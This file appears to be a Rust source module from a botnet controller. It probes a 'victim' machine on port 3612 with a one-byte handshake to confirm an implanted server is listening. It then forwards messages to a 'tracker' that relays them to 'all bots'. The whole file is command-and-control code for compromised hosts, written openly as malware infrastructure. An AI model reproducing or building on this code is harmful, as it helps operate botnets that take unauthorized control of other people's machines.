use tokio::{io::{AsyncReadExt, AsyncWriteExt, BufReader}, net::TcpStream};
use tokio::sync::broadcast::Receiver;

use crate::Victim;

pub async fn is_victim_listening(victim: &Victim) -> bool {
    let mut stream = match TcpStream::connect(victim.ip.ip().to_string() + ":3612").await {
        Ok(stream) => stream,
        Err(_) => {
            error!("Failed to connect to {}'s server", victim.ip);
            return false;
        }
    };

    if stream.write_all(&[1]).await.is_err() {
        return false;
    }
    let mut buf_reader = BufReader::new(&mut stream);
    let mut buffer: [u8; 1] = [0];
    if let Err(err) = buf_reader.read_exact(&mut buffer).await {
        error!("Failed to read from {}'s server: {}", victim.ip, err);
        return false;
    }
    if buffer != [9] {
        error!("{}'s server didn't send 9 back", victim.ip);
        return false;
    }
    true
}

/// Forwards messages sent to the channel to the tracker that will send it to all bots
pub async fn manage_tracker(_victim: &Victim, stream: &mut TcpStream, mut receiver: Receiver<&str>) -> Result<(), Box<dyn std::error::Error>> {
    stream.write_all(b"tracker\0").await?;
    debug!("Managing tracker");
    loop {
        let message = receiver.recv().await.unwrap();
        debug!("Sending message {}", message);
        stream.write_all(message.as_bytes()).await?;
    }
}
